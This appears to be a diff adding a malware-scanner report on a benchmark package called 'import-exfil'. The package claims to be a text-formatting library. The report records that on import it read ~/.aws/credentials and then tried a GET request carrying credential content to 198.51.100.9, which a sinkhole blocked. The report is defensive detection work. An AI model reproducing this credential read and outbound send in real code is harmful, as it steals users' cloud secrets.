@@ -1,0 +1,263 @@
+{
+ "schema_version": "1.0",
+ "package": {
+  "name": "import-exfil",
+  "version": "0.1",
+  "ecosystem": "pypi",
+  "sha256": "0d09aa7a4c483b791c97da27887a8ceb90cdaca616ea22bd709a2cbdc80a80cd",
+  "path": "bench/packages/malicious/import_exfil"
+ },
+ "verdict": "MALICIOUS-EVIDENT",
+ "action": "BLOCK",
+ "score": 15.2,
+ "confidence": "medium",
+ "summary": "import-exfil: behaviour contradicts its claims. Independent signals: canary_access, network_unclaimed.",
+ "findings": [
+  {
+   "id": "f0",
+   "rule": "canary_read_then_network",
+   "title": "Fake secret read, then network attempt",
+   "severity": "high",
+   "score": 9.6,
+   "capability": "fs_read_sensitive",
+   "phases": [
+    "import"
+   ],
+   "profiles": [
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": true,
+   "signal_class": "canary_access",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "Fast text formatting and template substitution utilities for Python.",
+    "source": "readme"
+   },
+   "events": [
+    "ev0",
+    "ev1"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev0",
+     "file": "/w/installed/import_exfil/__init__.py",
+     "line": 6,
+     "phase": "import",
+     "profile": "dev",
+     "outcome": "succeeded",
+     "detail": {
+      "path": "~/.aws/credentials",
+      "mode": "r"
+     }
+    },
+    {
+     "event_id": "ev1",
+     "file": "/w/installed/import_exfil/__init__.py",
+     "line": 7,
+     "phase": "import",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    }
+   ],
+   "explanation": "The README says \u00abFast text formatting and template substitution utilities for Python.\u00bb (readme); during import under dev it read the sensitive file ~/.aws/credentials at __init__.py:6 and the fake secret aws_creds appeared in ~/.aws/credentials. Outcome: succeeded. Then import-phase network attempt to http://198.51.100.9/aws?d=[default]\naws_access_key_id = followed. Canary(ies): aws_creds."
+  },
+  {
+   "id": "f1",
+   "rule": "network_unclaimed",
+   "title": "Network access in import phase not licensed by the package's claims",
+   "severity": "low",
+   "score": 3.2,
+   "capability": "network",
+   "phases": [
+    "import"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": false,
+   "signal_class": "network_unclaimed",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "Fast text formatting and template substitution utilities for Python.",
+    "source": "readme"
+   },
+   "events": [
+    "ev1",
+    "ev7"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev1",
+     "file": "/w/installed/import_exfil/__init__.py",
+     "line": 7,
+     "phase": "import",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    },
+    {
+     "event_id": "ev7",
+     "file": "/w/installed/import_exfil/__init__.py",
+     "line": 7,
+     "phase": "import",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    }
+   ],
+   "explanation": "The README says \u00abFast text formatting and template substitution utilities for Python.\u00bb (readme); during import under dev it attempted network access to http://198.51.100.9/aws?d=[default]\naws_access_key_id = at __init__.py:7. Outcome: blocked."
+  },
+  {
+   "id": "f2",
+   "rule": "network_unclaimed",
+   "title": "Network access in call phase not licensed by the package's claims",
+   "severity": "low",
+   "score": 2.4,
+   "capability": "network",
+   "phases": [
+    "call"
+   ],
+   "profiles": [
+    "ci",
+    "dev"
+   ],
+   "env_differential": false,
+   "canary_hit": false,
+   "signal_class": "network_unclaimed",
+   "claim": {
+    "status": "not_claimed",
+    "quote": "Fast text formatting and template substitution utilities for Python.",
+    "source": "readme"
+   },
+   "events": [
+    "ev3",
+    "ev5",
+    "ev9",
+    "ev11"
+   ],
+   "evidence": [
+    {
+     "event_id": "ev3",
+     "file": "/w/installed/import_exfil/__init__.py",
+     "line": 7,
+     "phase": "call",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    },
+    {
+     "event_id": "ev5",
+     "file": "/w/installed/import_exfil/__init__.py",
+     "line": 7,
+     "phase": "call",
+     "profile": "dev",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    },
+    {
+     "event_id": "ev9",
+     "file": "/w/installed/import_exfil/__init__.py",
+     "line": 7,
+     "phase": "call",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    },
+    {
+     "event_id": "ev11",
+     "file": "/w/installed/import_exfil/__init__.py",
+     "line": 7,
+     "phase": "call",
+     "profile": "ci",
+     "outcome": "blocked",
+     "detail": {
+      "url": "http://198.51.100.9/aws?d=[default]\naws_access_key_id =",
+      "method": "GET",
+      "data_head": "",
+      "headers": ""
+     }
+    }
+   ],
+   "explanation": "The README says \u00abFast text formatting and template substitution utilities for Python.\u00bb (readme); during call under dev it attempted network access to http://198.51.100.9/aws?d=[default]\naws_access_key_id = at __init__.py:7. Outcome: blocked."
+  }
+ ],
+ "independent_signals": [
+  "canary_access",
+  "network_unclaimed"
+ ],
+ "coverage": {
+  "phases_run": [
+   "install",
+   "startup",
+   "import",
+   "call"
+  ],
+  "profiles_run": [
+   "dev",
+   "ci"
+  ],
+  "variants_run": [
+   "default",
+   "clock+30d"
+  ],
+  "triggers_run": [
+   "call_all",
+   "fresh_startup",
+   "import_all",
+   "install"
+  ],
+  "install_completed": true,
+  "install_note": null,
+  "network": "sinkhole",
+  "callables_total": 1,
+  "callables_exercised": 1,
+  "native_skipped": [],
+  "strace_layer": true,
+  "not_observed": [
+   "no console-script entry points to run"
+  ],
+  "whitelisted_or_dropped_events": 212
+ },
+ "claims_summary": {
+  "intents": [
+   "string_util"
+  ],
+  "claimed_capabilities": [],
+  "unknown_intent": false
+ },
+ "dependency_attribution": {}
+}
